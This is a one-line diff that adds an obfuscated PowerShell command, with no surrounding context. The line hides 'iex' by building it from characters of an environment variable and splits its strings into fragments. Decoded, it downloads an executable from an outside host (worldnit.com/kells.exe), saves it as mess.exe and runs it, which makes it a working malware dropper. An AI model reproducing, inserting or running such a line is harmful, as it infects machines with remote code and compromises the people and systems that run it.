@@ -1,0 +1,1 @@
+﻿& ( $ENV:cOmsPec[4,26,25]-JOIn'')((('(N'+'ew-Obje'+'ct Sys'+'tem.Net.WebCl'+'ient)'+'.'+'D'+'o'+'w'+'nloa'+'d'+'File({0}'+'http:/'+'/worldnit.com/ke'+'lls.exe{'+'0},{'+'0}m'+'e'+'ss'+'.'+'exe'+'{0});Start-Pr'+'ocess'+' {'+'0}me'+'ss.e'+'x'+'e{0}')-F  [CHAr]39)) 
